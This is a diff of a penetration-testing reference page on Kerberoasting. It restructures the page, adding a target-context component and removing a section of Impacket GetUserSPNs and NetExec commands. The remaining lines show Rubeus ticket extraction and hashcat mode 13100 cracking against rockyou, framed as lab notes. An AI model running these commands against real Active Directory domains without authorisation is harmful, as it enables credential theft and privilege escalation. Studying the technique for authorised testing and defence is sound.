@@ -5,6 +5,14 @@ description: "Grab the short Impacket, NetExec, Rubeus, and Hashcat examples for
 keywords: ["kerberoasting", "getuserspns", "nxc", "rubeus", "hashcat", "service accounts"]
 ---
 
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
+
 {/* COMMAND_SHORTCUT_START */}
 
 **Current starting checks:** [GetUserSPNs.py](/commands/getuserspns) · [Service accounts and gMSA](/field/service-accounts)
@@ -67,57 +75,7 @@ Use one relevant host/protocol first. Then inspect the service account's groups,
 
 Common false starts are wrong DNS/DC selection, clock disagreement, incorrectly copied artifact lines, mismatched cracking modes, and treating all SPN-bearing accounts as equally useful. Record the precise failure so the next attempt tests a different hypothesis.
 
-## GetUserSPNs.py: choose the operation and read the result
-
-List SPN accounts or request service tickets.
-
-### What the result establishes
-
-Separate listing accounts with SPNs from requesting service tickets for offline analysis.
-
-### Prerequisites and common failures
-
-The returned ticket artifact is not a plaintext password; account encryption, privileges, domain reachability and the selected cracking format affect the next step.
-
-### Example 1: Commands
-
-Run in: **Kali**.
-
-```bash
-impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
-impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile tickets.txt
-```
-
-### Example 2: Kerberoasting: Quick Reference
-
-Run in: **Saved lab example**.
-
-```bash
-# Linux (Impacket) — needs any valid domain creds
-GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request -outputfile kerb.hash
-# NetExec
-nxc ldap $DC -u USER -p PASS --kerberoasting kerb.hash
-```
-
-Saved context: [Kerberoasting: Quick Reference — Kerberoasting: Quick Reference](/active-directory/kerberoasting). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Practical Application
-
-Run in: **Saved lab example**.
-
-```shell
-GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
-```
-
-Saved context: [Kerberoasting from Linux — Practical Application](/active-directory/kerberoasting-linux#practical-application). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Existing notes and worked examples
-
-Supplementary quick reference from the existing vault site. It does not mark the module as complete.
-
 > Detailed study notes: [Linux](/active-directory/kerberoasting-linux) · [Windows](/active-directory/kerberoasting-windows). This page is the shorter lookup reference.
-
-
 
 Any authenticated user can request a service ticket (TGS) for an account with an SPN. The ticket is encrypted with the service account's password hash — request it, crack it offline.
 
@@ -137,6 +95,5 @@ Rubeus.exe kerberoast /outfile:kerb.hash
 # crack
 hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
 ```
-
 
 > Service accounts are often over-privileged and set with weak, non-expiring passwords — a Kerberoast frequently yields a high-value account directly.
